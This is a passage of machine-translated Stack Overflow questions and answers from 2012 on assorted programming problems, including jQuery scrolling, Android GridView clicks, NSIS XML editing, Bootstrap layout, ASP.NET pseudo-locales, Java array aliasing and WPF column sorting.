即你必须阻止其中之一。请申请一个。如果您使用 .menu li 边框，那么您不需要为 .menu li a 使用边框，反之亦然。

# jquery - jQuery scrollTo / localScroll 适用于除一个元素之外的所有元素

> ID：11927647
> 
> 赞同：-1
> 
> 时间：2012-08-13T02:47:57.800
> 
> 标签：jquery, scrollto

看看我为代理机构开发的这个网站。

[http://oakinteractive.co/](http://oakinteractive.co/)

我使用 localScroll 插件在各个部分之间滚动。他们要求我添加另一个部分，无论出于何种原因，该插件似乎被忽略了。单击“每日灵药”，然后单击“提交”。而不是滚动到该部分，它只是跳转到它并且哈希出现在 URL 中。在其他任何链接上都不会发生这种情况。

这是用于调用滚动的代码，其中突出显示了新部分：

```
$('#navContainer, #navShindigs, #navTidbits, #navBarnburners, #navLegend, #shindigs, **#recipeForm**').localScroll({
        target: '#contentViewport',
        easing: 'easeOutSine'
}); 
```

这是该部分的链接：

```
<a href="#recipeForm"><img id="submit_elixir" src="grfx/submit.png" /></a> 
```

这是部分：

```
 <div id="recipeForm">
      <section id="section_recipe">
            <fieldset>
                  <h2>Submit a Recipe</h2>
                  <form id="mailform" name="contact" method="post" action="inc/procMail.php">
                  <label for="yourName">Your Name</label><input type="text" name="yourName" id="yourName" value="" />
                  <label for="yourEmail">E-mail Address</label><input type="text" name="yourEmail" id="yourEmail" value=""/>
                  <label for="yourMessage">Your Recipe</label><textarea name="yourMessage" id="yourMessage" rows="3"></textarea>
                  <input type="image" name="Send Recipe" alt="Send Recipe" class="sendEmail" src="grfx/submit_button.png" />
                  </form>
            </fieldset>
      </section>
</div> 
```

网站上的所有其他 jQuery 代码都可以工作，包括滚动所有其他元素。只是这个添加的部分似乎被忽略了。

任何人都可以阐明或提供任何见解吗？我以前从未遇到过 scrollTo 或 localScroll 插件的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-21T16:34:56.017

我在另一双眼睛的帮助下发现了这个问题。我需要包含选择器#elixir，而不是包含选择器#recipeForm。看看#photobooth 也是一样。localScroll 调用中的选择器都是容器，而不是结束元素。有时很难看到选择器中还列出了一些结束元素。

# android - Android Gridview 和按钮 OnItemclick

> ID：11927651
> 
> 赞同：4
> 
> 时间：2012-08-13T02:48:31.757
> 
> 标签：android, gridview, onitemclicklistener, onitemclick

这是我认为准确的 buttonAdapter 类：

```
package com.example.test;

import android.content.Context; 
import android.graphics.Color; 
import android.view.View; 
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.Button; 
import android.widget.GridView;

public class ButtonAdapter extends BaseAdapter { 
    private Context mContext; 
    public String [] fName = { "File 1", "File 2", "Roflcopters"};

    // Gets the context so it can be used later 
    public ButtonAdapter(Context c) { mContext = c; }

    // Total number of things contained within the adapter 
    public int getCount () { return 8; }

    // Require for structure, not really used in my code. 
    public Object getItem (int position) {  return null; }

    // Require for structure, not really used in my code. Can be used to get the id of an item in the adapter for manual control. 
    public long getItemId (int position) { return position; }

    public View getView (int position, View convertView, ViewGroup parent){     
        Button btn;         
        if (convertView == null) {      // if it's not recycled, initialize some attributes      
            btn = new Button (mContext);
            btn.setLayoutParams (new GridView.LayoutParams (190, 190));
            btn.setPadding (1, 1, 1, 1);    
        } else {        
            btn = (Button) convertView;
        }       
      // btn.setText(filesnames[position]);   
      // filenames is an array of strings    
      //btn.setTextColor (Color.WHITE);
      //btn.setBackgroundResource (R.drawable.sample_2);  
      //btn.setBackgroundColor (Color.BLACK);     
      btn.setHighlightColor(Color.GREEN);    
      btn.setId (position);

      return btn; 
    } 
} 
```

这是我的家庭课。我无法让 onItemClick 工作。我在这里做错了什么：

```
package com.example.test;

import android.app.Activity; 
import android.content.Intent; 
import android.os.Bundle; 
import android.view.Menu; 
import android.view.View;
import android.view.View.OnClickListener; 
import android.widget.AdapterView; 
import android.widget.AdapterView.OnItemClickListener; 
import android.widget.GridView; 
import android.widget.Toast;

public class home extends Activity implements OnItemClickListener {

    public final static String EXTRA_MESSAGE1 = "com.example.text.MESSAGE";

    public void onCreate (Bundle savedInstanceState) {    
        super.onCreate(savedInstanceState);     
        setContentView (R.layout.activity_home);    

        GridView gridview = (GridView) findViewById (R.id.gridview);
        gridview.setAdapter (new ButtonAdapter (this));     

        /*gridview.setOnItemClickListener (new OnItemClickListener () {
           public void onItemClick (AdapterView <?> parent, View v, int position, long id) {          
            Toast.makeText (home.this, "" + position, Toast.LENGTH_LONG).show ();
            Intent intent = new Intent (this, alarm.class);       
            String message = "Position:" + position;            
            intent.putExtra(EXTRA_MESSAGE1, message);        
            startActivity (intent);         
            }     
        });   
     * */    
     }

    @Override 
    public void onItemClick (AdapterView <?> parent, View v, int position, long id) {  
        Intent intent = new Intent (this, alarm.class);
        String message = "Position:" + position;        
        intent.putExtra(EXTRA_MESSAGE1, message);        
        startActivity (intent);  
    }
} 
```

onItemClick 不起作用，注释的“setOnItemClickListener”也不起作用，当它没有被注释掉并且“onItemClick”被注释时。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T03:22:31.313

如果`GridView, ListView`有像 BUtton 这样的可点击控件，则`onItemClick`不会触发。
您需要在适配器的方法中`Button Click listener`实现 。`getView`

喜欢

```
public View getView(int position, View convertView, ViewGroup parent) {
    Button btn;
    if (convertView == null) { // if it's not recycled, initialize some
                                // attributes btn = new Button (mContext);
        btn.setLayoutParams(new GridView.LayoutParams(190, 190));
        btn.setPadding(1, 1, 1, 1);
    } else {
        btn = (Button) convertView;
    } // btn.setText(filesnames[position]); // filenames is an array of
        // strings //btn.setTextColor (Color.WHITE);
    // btn.setBackgroundResource (R.drawable.sample_2);
    // btn.setBackgroundColor (Color.BLACK);
    btn.setHighlightColor(Color.GREEN);
    btn.setId(position);
    btn.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            // TODO Handle the click here

        }
    });
    return btn;

} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-07-27T06:25:53.020

You can add this line in the root layout of GridView items:

```
android:descendantFocusability="blocksDescendants" 
```

Then `onItemClickListener.onItemClick()` will not fire when you tap on subviews which OnClickListener has been defined for them separately.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-05T02:31:47.247

我已经测试过 Set Button.onClickListener() （在 API 15 中）不会解决问题。

因此，如果 GridView 包含**可点击**的视图，它将不会触发 onItemClick。

您可以使用 ImageView 代替 Button。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-03-13T08:46:57.280

当我试图在充满按钮的地方实现时，我遇到了同样的`onitemclick`问题`gridview`。因为按钮是偷每个空间的焦点`gridview`，你必须给按钮充气`android:focusable="false"`。但是，该按钮几乎占据了网格内的整个空间，因此您必须单击按钮的最边缘才能触发`onitemclick`回调。我建议您可以设置`onclick`或使用图像并将其设计为按钮。

# xml - 将大型 XML 元素添加到 XML 文件总是失败

> ID：11927656
> 
> 赞同：0
> 
> 时间：2012-08-13T02:49:01.470
> 
> 标签：xml, installation, nsis

我的 NSIS 安装程序正在尝试将一些 XML 添加到现有 XML 文件中。

**我的问题：**它未能将节点/元素添加到文件中，因为我认为节点/元素内的子元素太多。

如何将此 XML 元素添加到现有 XML 文件中？

**注意**如果我将字符串 OVERRIDES_TEXT 的长度减少了大约一半，那么代码会正确地将节点添加到 XML 文件中。再长一点，它就会失败。是否可以在 2 go 中写入元素/节点的内容（不是文本，而是子元素）？

```
${xml::LoadFile} "${xmlFileName}" $R0
${xml::GotoPath} "${elementPath}" $R0
${xml::CreateNode} '<Overrides>${OVERRIDES_TEXT}</Overrides>' $R0
${xml::InsertAfterNode} $R0 $R1  # always fails here $R1 = -1

# below is the string that causes the error
!define OVERRIDES_TEXT "<Override>\
                <Key>EXDS_CUSTOMISATION_REVISION</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>CUSTOMER_USER_4D</Key>\
                <Value>C:\12d\10.00\Customers\EXDS_Customisation\EXDS_User</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>CUSTOMER_LIB_4D</Key>\
                <Value>C:\12d\10.00\Customers\EXDS_Customisation\EXDS_User_Lib</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>USER_4D</Key>\
                <Value>C:\12d\10.00\User</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>USER_LIB_4D</Key>\
                <Value>C:\12d\10.00\User_Lib</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>EXDS_USER_LIB</Key>\
                <Value></Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>EXDS_USER</Key>\
                <Value></Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>VERSION_12D_MODEL</Key>\
                <Value>10.0</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>CPATH</Key>\
                <Value>$$CUSTOMER_LIB_4D:$$CUSTOMER_USER_4D:$$USER_LIB_4D:$$USER_4D:$$LIB_4D:$$SET_UPS_4D</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>AUTHORIZATION_4D</Key>\
                <Value>C:\12d\10.00\nodes.4d</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>USE_NAMES_COMMENT_4D</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>FILE_READ_ADD_TO_VIEW_4D</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>GENIO_WILDCARD_4D</Key>\
                <Value>*.inp</Value>\
                <State>1</State>\
            </Override>\
            <Override>\
                <Key>RUN_MACROS_FILE_4D</Key>\
                <Value>$$USER\macros.4d</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>PROJECT_DETAILS_4D</Key>\
                <Value>$$USER\project_details.dtl</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>REPORT_HEADER_4D</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>AUTO_TIN_SYNC_4D</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>AUTO_MODEL_SYNC_4D</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>SHARE_CHECK_INTERVAL_4D</Key>\
                <Value>300</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>SHARED_ELEMENT_COLOUR_4D</Key>\
                <Value>blue</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>SHARING_ELEMENT_COLOUR_4D</Key>\
                <Value>red</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>DEFAULT_PLAN_PLOT_SCALE_4D</Key>\
                <Value>500</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>DWG_PLOT_SEED_FILE_4D</Key>\
                <Value>$$USER\EXDS_Acad_Plot_Template.dwt</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>DEFAULT_RASTER_DPI_4D</Key>\
                <Value>600</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>OPENGL_VIEW_BACKING_STORE_4D</Key>\
                <Value>2</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>MULTI_LINE_TEXT_4D</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>NEW_MTF_EDITOR_AUTOPAN_DEFAULT_4D</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>WINDOWS_VEHICLE_PATH_4D</Key>\
                <Value>C:\Apps\VPath</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>chainage_equality_4d</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>XML_4D</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>\
            <Override>\
                <Key>USE_V10_BOXING_CALCS_4D</Key>\
                <Value>1</Value>\
                <State>0</State>\
            </Override>" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T10:19:46.043

You are probably hitting the NSIS string length limit, try adding one `<Override>` node at the time with the XML plugin...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T03:12:45.950

我不确定这种语法是否正确：

```
${xml::InsertAfterNode} $R0 $R1 
```

难道不是吗

```
${xml::InsertAfterNode} "$R0" $R1 
```

?

# objective-c - 如何拥有多个 MKNetworkKit 子类？

> ID：11927657
> 
> 赞同：0
> 
> 时间：2012-08-13T02:49:11.350
> 
> 标签：objective-c, rest, ios5, subclassing, mknetworkkit

我目前正在使用 MKNetworkKit 来缓存从 restful 服务器下载的几个图像。我有另一个宁静的服务，我 ping 以获取有关图像的补充信息。无论我首先 ping 哪个服务器都可以，但是在 ping 第二个服务器时，我收到以下错误：

> [操作无法完成。（NSURLErrorDomain 错误 404。）] 2012-08-12 19:51:12.340 [51853:11603]
> 
> 错误：错误域=NSURLErrorDomain 代码=404“操作无法完成。（NSURLErrorDomain 错误 404。）”UserInfo=0x73c5490 {Server=Apache-Coyote/1.1，Content-Length=47，Content-Type=text/html ;charset=ISO-8859-1，Connection=keep-alive，Date=Sun，2012 年 8 月 12 日 23:51:11 GMT} 2012-08-12 19:51:12.341 [MKNetworkOperation operationFailedWithError:] [Line 1280] 状态： 0

MKNetworkKit 正在 ping 第一台服务器以尝试从第二台服务器的 URL 获取数据。我想我可能需要创建另一个可达性对象？知道我做错了什么吗？或者我在哪里可以找到一个具有多个子类的项目的示例实现？

*编辑* 我通过以下方式实现两个引擎：

```
@implementation FirstEngine

FirstEngine* _sharedEngine;

+(FirstEngine*)sharedEngine
{
    if(_sharedEngine==nil)
    {
        _sharedEngine = [[FirstEngine alloc] initWithHostName:@"***.**.**.**" customHeaderFields:nil];            
    }
    return _sharedEngine;
} 
```

并以这种方式调用它们：

```
$[[FirstEngine sharedEngine] bodyForPath:url verb:verb body:params onCompletion:^(NSDictionary* body)
{}.... 
```

或者

```
$[[SecondEngine sharedEngine] bodyForPath:url verb:verb body:params onCompletion:^(NSDictionary* body)
{}.... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T09:16:24.970

您应该在 AppDelegate 中为您与之交谈的“每个”服务器创建一个 MKNetworkEngine 对象。

```
self.imageCacheEngine = [[MKNetworkEngine alloc] initWithHostName:@"images.myserver.com"]; 
```

和

```
self.apiEngine =  [[MKNetworkEngine alloc] initWithHostName:@"api.myserver.com"]; 
```

将图像请求排队到 imageCacheEngine 和 api 请求到您的 apiEngine。

# iphone - iPhone 缩放：看不到完整的网站

> ID：11927658
> 
> 赞同：1
> 
> 时间：2012-08-13T02:49:23.367
> 
> 标签：iphone, html, css, media-queries

我的页面内容不多，因此高度很小，我遇到了一些问题。iPhone 正在缩放页面，因此，我看不到完整的菜单栏（960 像素宽）。我使用媒体查询为纵向模式和具有最小分辨率的移动设备设置了最小高度。我真的不喜欢这样做，因为我不知道这将如何在其他设备上工作，并且仅在用户不旋转屏幕时才有效（旋转后，原始问题再次出现）。

即使内容的高度没有填满屏幕，是否有某种方法可以强制 iphone 显示 960px 的最小宽度？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:56:05.897

您可以使用此 META 标签控制 Apple 移动设备的视口宽度和最大比例（允许放大深度访问者）：

`<meta name="viewport" content="width=960px, maximum-scale=1.0" />`

也适用于 Android 和其他移动浏览设备。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-15T08:24:20.657

默认情况下，iOS 浏览器提供一组默认屏幕尺寸，而不管实际屏幕分辨率*或方向*。

为了让他们为@media 标签提供**实际的屏幕尺寸**，他们将遵守一个 Meta 标签：

```
<meta name="viewport" content="width=device-width, initial-scale=1"> 
```

如果您将此添加到您的页面，那么您的 @media 命令应该适用于每个设备的*实际屏幕分辨率*。然后，您可以完全控制您的 @media 查询

然后，您可以使用诸如`width: 100%`使用实际屏幕宽度之类的东西。

*   [https://developer.mozilla.org/en-US/docs/Mozilla/Mobile/Viewport_meta_tag](https://developer.mozilla.org/en-US/docs/Mozilla/Mobile/Viewport_meta_tag)

# asp.net - System.Net.Mail.MailMessage 的替代品来发送电子邮件？

> ID：11927659
> 
> 赞同：0
> 
> 时间：2012-08-13T02:49:58.297
> 
> 标签：asp.net, email, iis, smtp

我正在寻找一个 .NET 程序集，我可以在 ASP.Net 3.5 中使用它来一次发送一两封电子邮件。

我查看了**System.Net.Mail.MailMessage**，但脚本和邮件服务器之间产生的通信使用 ESMTP，我*真的*很想避免这种情况。

要发送的电子邮件尽可能简单：未加密；不是html；等等

优先级是易于部署，所以不想弄乱 IIS、Exchange 等。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T01:28:29.667

我查看了 MSDN，似乎没有办法强制 System.Net.Mail 使用较旧的 smtp 标准 (RFC821)，但您不需要这样做。

根据下一篇文章的备注部分，System.Net.Mail 实现了 RFC2821，它指出如果主机无法识别 EHLO（或扩展 HELO）问候语，则客户端应发出 HELO 并仅使用 RFC821 中可用的命令继续。 [http://msdn.microsoft.com/en-us/library/system.net.mail.smtpclient.aspx](http://msdn.microsoft.com/en-us/library/system.net.mail.smtpclient.aspx)

正如我们在评论中讨论的那样，因为您只是想避免使用身份验证，因此您可以使用 System.Net.Mail 库而无需进行身份验证。

# git - git pull 不工作，总是显示“接收对象”

> ID：11927660
> 
> 赞同：1
> 
> 时间：2012-08-13T02:50:25.710
> 
> 标签：git, pull

我正在使用 git，但我今天无法拉取 origin master

```
git pull origin master
remote: Counting objects: 286, done.
remote: Compressing objects: 100% (106/106), done.
receiving objects:  38% (70/184), 196.00 KiB   3 KiB/s 
```

我对此一无所知，它是我的 git 服务器之一，但我可以使用 github 并拉取源，帮助我...

我的英语太差了，希望你不要介意。谢谢

# formatting - Bootstrap 中的网格系统我缺少什么？

> ID：11927661
> 
> 赞同：1
> 
> 时间：2012-08-13T02:50:34.223
> 
> 标签：formatting, twitter-bootstrap, html

请随时纠正我，但根据我对引导 CSS 的理解，spans1、2、3、4 等应该使在网页上布局数据变得容易。一整行应该是一个 span12 意味着两个 6 个跨度应该等于一整行，内容是 50/50 间隔？到目前为止这是正确的吗？

```
<div class="hero-unit">
    <div class ="span4">First name: <input  type="text"  runat="server" placeholder="Enter First Name" name="firstname" id="firstname"/></div>
    <div class ="span4">Last name: <input  type="text"  runat="server" placeholder="Enter Last Name" name="lastname" id="lastname"/></div>
    <div class ="span2">Student Number: <input  type="text"  runat="server" placeholder="Enter Student Number" name="Student Number" id="StudentNumber"/> </div>
    <div class ="span2">Course code & Name:  <input  type="text"  runat="server" placeholder="Enter Course Code" name="CourseCode" id="CourseCode"/></div>
    <div class ="span4">Course code & Name: <input   type="text" runat="server" placeholder="Enter Course Code" name="CourseCode" id="Text1"/> </div>
</div> 
```

结果看起来没有我所期望的那样。此处表格混乱的图像[示例 http://img546.imageshack.us/img546/6361/35787686.png](http://img546.imageshack.us/img546/6361/35787686.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T22:59:16.123

再次感谢汤姆解决方案代码如下：-

```
<div class="row-fluid">
  <h1>Personal Details</h1></div><div class="row hero-unit">
  <div class="row-fluid">
    <div class ="span2">First name:</div> 
    <div class="span4">
      <input  type="text"  runat="server" 
              placeholder="Enter First Name" 
              name="Firstname" id="Firstname" />
    </div>
    <div class ="span2">Last name:</div> 
    <div class="span4">
       <input  type="text"  runat="server" 
               placeholder="Enter Last Name" 
               name="Lastname" id="Lastname"/>
    </div>
  </div>
  <div class="row-fluid">
    <div class ="span2">Student Number:</div> 
    <div class="span4"> 
      <input type="text"  runat="server" 
             placeholder="Enter Student Number" 
             name="Student Number" id="StudentNumber"/>
    </div>
    <div class ="span2">Course Name:</div> 
    <div class="span4"> 
      <input type="text"  runat="server" 
             placeholder="Enter Course Code" 
             name="CourseCode" id="CourseCode"/>
    </div> 
  </div>
  <div class="row-fluid">
    <div class ="span2">Mail Address:</div> 
    <div class="span10">
      <input type="text" class="span10" runat="server" 
             placeholder="Enter Postal Address" 
             name="PostalAddress" id="PostalAddress"/> 
    </div>
  </div>
</div> 
```

可以在这里看到更好的格式化结果：- [http://imageshack.us/photo/my-images/502/homepageim.png/](http://imageshack.us/photo/my-images/502/homepageim.png/)

# c# - 识别未本地化的文本

> ID：11927671
> 
> 赞同：2
> 
> 时间：2012-08-13T02:53:13.837
> 
> 标签：c#, asp.net, localization, asp.net-4.0

在 ASP.NET 中，可以使用资源文件对应用程序进行本地化。资源文件包含不同的翻译。例如，可能有一个英文资源文件和一个西班牙文资源文件。使用资源文件时，可以将属性应用于网页上的控件，以使用资源文件中的值自动填充该控件。或者，可以以编程方式从资源文件加载这些值并将其分配给控件的属性。

ASP.NET 使用后备机制来加载翻译。它试图找到与当前用户文化最相似的资源文件。如果当前用户的文化是西班牙语，ASP.NET 会尝试从西班牙语资源文件加载适当的资源。如果西班牙语资源不可用，它将回退到默认资源文件。由于这种行为，西班牙用户的文本可能会以默认语言显示，原因有两个：

1.  没有西班牙语翻译。（翻译人员尚未提供此项目的翻译。）
2.  文本未本地化。（这可能是页面中出现纯文本或消息在某处被硬编码的结果。）

如果文本以默认语言显示，我想知道是因为原因 1 还是因为原因 2。

对于每个丢失的翻译，我可以在资源文件中插入某种占位符文本。但是，这意味着我正在抛弃回退机制。更糟糕的是，如果占位符文本意外进入生产环境，它看起来比显示默认文本要糟糕得多。

有没有人有任何建议（或解决方案）来确定这两个条件中的哪一个是在手动测试期间出现默认文本的原因？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-24T20:55:16.383

如果我对您的理解正确，您想验证每个可本地化的文本确实是可本地化的，并且没有在代码中烧毁。为此，您不应使用真正的文化（西班牙语），而应为虚假的不受支持的文化创建资源，并为默认资源中可用的每个可本地化资源条目提供自动翻译。

例如，如果您有一个默认资源，其中包含：

*   条目1：这是一个测试！

你应该在你的虚假文化中创建一个资源，其中包含：

*   条目 1：Th1s 1s @ t€st！

您甚至可以（并且应该）使用简单的字符映射自动创建假资源。这样，当您将应用程序设置为使用自定义的假文化时，您就知道每个条目都有翻译，因此您可以找到硬编码文本。**此策略由 Windows 使用，**称为[pseudo-locales](http://msdn.microsoft.com/en-us/library/windows/desktop/dd319106%28v=vs.85%29.aspx)。使用伪翻译字符串可以使用假文化进行开发，因为文本仍然是可读的，这**提高了您找到硬编码文本的可能性**。

自 Windows Vista 和 Windows 2008 R2 起，Windows 就支持伪语言环境，因此如果您的构建和测试环境使用这些操作系统，您可以将您的假文化与这些伪语言环境之一相关联（例如`qps-ploc`）。如果您有不受支持的操作系统，只需将您的虚假资源与您可能永远不会支持的真实文化相关联，或者只是创建自己的文化。

另请注意，即使在受支持的操作系统中，Visual Studio 也不会为这些伪语言环境创建附属程序集，除非您[在注册表中启用它们](http://msdn.microsoft.com/en-us/library/windows/desktop/dd374118%28v=vs.85%29.aspx)。

# windows-phone-7 - 在 windows phone 7 中创建 pppoe 连接

> ID：11927674
> 
> 赞同：0
> 
> 时间：2012-08-13T02:53:25.850
> 
> 标签：windows-phone-7

我正在编写一个允许在 windows phone 7 中创建 pppoe 的应用程序。目标是能够通过无线拨打具有给定用户名/密码的连接。

t 我应该使用什么 API？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T03:00:30.120

我没有使用过 PPPoE，但是根据名称，您可能需要使用原始套接字。

查看[适用于 Windows Phone 的网络和 Web 服务概述，](http://msdn.microsoft.com/en-us/library/windowsphone/develop/ff637518%28v=vs.92%29.aspx)了解您可以使用哪些选项。然后您可能需要查看[Sockets for Windows Phone](http://msdn.microsoft.com/en-us/library/windowsphone/develop/hh202870%28v=vs.92%29.aspx)和相关的[System.Net.Sockets 参考文档](http://msdn.microsoft.com/en-us/library/system.net.sockets%28v=VS.95%29.aspx)。

# c#-4.0 - 我如何使用 Emgu CV _SmoothGausian 方法

> ID：11927676
> 
> 赞同：0
> 
> 时间：2012-08-13T02:53:55.457
> 
> 标签：c#-4.0, gaussian, emgucv, computer-vision

我试图让 OCR 示例应用程序识别一些小文本，而我的做法是调整图像大小。一旦我调整了图像的大小，它都是'pixel-ee'

**我想使用SmothGaussian 方法来清理它，但每次执行该方法时都会出错**

这是代码：

```
Image<Bgr, Byte> image = new Image<Bgr, byte>(openImageFileDialog.FileName);

           using (Image<Gray, byte> gray = image.Convert<Gray, Byte>().Resize(800, 600, Emgu.CV.CvEnum.INTER.CV_INTER_LINEAR, true))
           {

               gray.Convert<Gray, Byte>()._SmoothGaussian(4);

              _ocr.Recognize(gray);
              Tesseract.Charactor[] charactors = _ocr.GetCharactors();
              foreach (Tesseract.Charactor c in charactors)
              {
                  image.Draw(c.Region, drawColor, 1);
              }

              imageBox1.Image = image;

              //String text = String.Concat( Array.ConvertAll(charactors, delegate(Tesseract.Charactor t) { return t.Text; }) );
              String text = _ocr.GetText();
              ocrTextBox.Text = text;
           } 
```

这是图像：

![在此处输入图像描述](../Images/22d5ad688b5b0017610bc30872624b07.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T14:20:26.123

`_SmoothGaussian`只能将奇数作为内核大小处理，因此请尝试使用 3 或 5 作为参数。

# svn - MacOSX MountainLion 上的 RubyMine 4.5.2 不断要求提供 SVN 凭据

> ID：11927680
> 
> 赞同：0
> 
> 时间：2012-08-13T02:55:09.137
> 
> 标签：svn, authentication, osx-mountain-lion, rubymine

自从每次与 Subversion 交互时升级到 RubyMine 4.5 和 MACOSX MountainLion 后，我都需要重新验证自己。似乎 SVN 身份验证缓存已损坏，无论是在 RubyMine、MountainLion 还是两者的组合中。还有人经历过这个吗？关于如何解决它的任何想法？

谢谢，帕特里克

# java - Java：数组如何工作

> ID：11927681
> 
> 赞同：5
> 
> 时间：2012-08-13T02:55:59.717
> 
> 标签：java, arrays, string

我今天正在处理相对较大的`String`阵列。（大约 400 x 400 大小）我想知道如何使一个数组与另一个数组相等。例如，

```
String[][] array1 = new String[400][400];
String[][] array2 = array1; 
```

使一个数组等于另一个数组与遍历每个元素并使其等于另一个数组中的相应位置相同吗？（如下所示）

```
for(int y = 0; y < 400; y++) {
    for(int x = 0; x < 400; x++) {
        array2[x][y] = array1[x][y];
    }
} 
```

现在循环方法与使一个数组等于另一个数组相同吗？还是第一个/第二个比另一个快？就个人而言，我认为第一个会更快，因为没有递归或必须`array2`在递归之前手动分配内存。但是，我不知道从哪里开始寻找这些信息，我想了解 Java 如何处理这些事情的逻辑。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-13T02:58:32.930

不，这不是一回事：数组是引用对象，因此`array2`成为 的别名`array1`，而不是其副本。您对元素所做的任何分配都`array2`通过 变得“可见” `array1`，反之亦然。如果要复制一维数组，可以使用它的`clone()`方法；请注意，副本将很*浅，即**不会*克隆数组的各个元素（使该技巧不适用于您在帖子中描述的二维数组）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-13T02:59:59.863

`array2 = array1`不复制元素，只复制数组引用。因此`array2`，`array1`两者都引用了相同的底层数组。

这很容易自己确定：

```
String[][] array1 = new String[4][4];
array1[0][0] = "some string";
String[][] array2 = array1;
array1[0][0] = "another string";
System.out.println("array2: " + array2[0][0]);
array2[0][0] = "a third string";
System.out.println("array1: " + array1[0][0]); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T03:01:13.420

嗯，我认为当您使一个数组等于另一个数组时，您只需更改引用即可。例如：

ARRAY 1 - * [][][][]...[][] 其中 * 是对 Array 1 的引用
Array 2 - & [][][][]...[][] 其中 & 是参考数组 2

然后设置 Array 1 = Array 2 Array 1 将简单地将其引用更改为 & 并开始读取内存引用 &

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T03:11:47.713

第一个代码示例中的第二行是创建一个 String [] 类型的引用变量，该变量引用引用 array1 所引用的同一个二维数组对象。内存中只有一个二维数组，但是有两个引用变量引用它，array1和array2。

您似乎对递归的定义感到困惑，因此我将在此处指出-[计算机科学中的递归](https://en.wikipedia.org/wiki/Recursion#Recursion_in_computer_science)。

# wpf - 单击列标题时对 GridView 进行排序

> ID：11927689
> 
> 赞同：1
> 
> 时间：2012-08-13T02:58:51.433
> 
> 标签：wpf, sorting, gridview

这是我的 wpf 文件我想在单击列标题时对 GridView 进行排序我尝试这个 make`<GridView AllowsColumnReorder="true">`但不工作

对不起，我的英语不好

```
 <ListView Name="deviceListBox"
                  Width="630"
                  Height="282"
                  HorizontalAlignment="Center"
                  VerticalAlignment="Center"
                  ItemsSource="{Binding Items}"
                  SelectionChanged="deviceListBox_SelectionChanged"
                  SelectionMode="Single">
            <ListView.View>
                <GridView>
                    <GridView.Columns>
                        <GridViewColumn>
                            <GridViewColumn.HeaderTemplate>
                                <DataTemplate>
                                    <Label Width="15"
                                           Height="25"
                                           Margin="10,0,0,0"
                                           HorizontalAlignment="center"
                                           VerticalAlignment="Center" />
                                </DataTemplate>
                            </GridViewColumn.HeaderTemplate>
                            <GridViewColumn.CellTemplate>
                                <DataTemplate>
                                    <Grid>
                                        <controls:PresenceIndicator Width="35"
                        Height="30"
                        Margin="7,0,0,0"
                        HorizontalAlignment="center"
                        VerticalAlignment="Center"
                        PhotoDisplayMode="Large"
                        SingleClickAction="ShowContactDetails"
                        Source="{Binding Path=SipURI}" />
                                    </Grid>
                                </DataTemplate>
                            </GridViewColumn.CellTemplate>
                        </GridViewColumn>
                        <GridViewColumn>
                            <GridViewColumn.HeaderTemplate>
                                <DataTemplate>
                                    <Label Width="95"
                                           Height="25"
                                           Margin="10,0,0,0"
                                           HorizontalAlignment="Left"
                                           VerticalAlignment="Center"
                                           Content="Username"
                                           Foreground="Black" />
                                </DataTemplate>
                            </GridViewColumn.HeaderTemplate>
                            <GridViewColumn.CellTemplate>
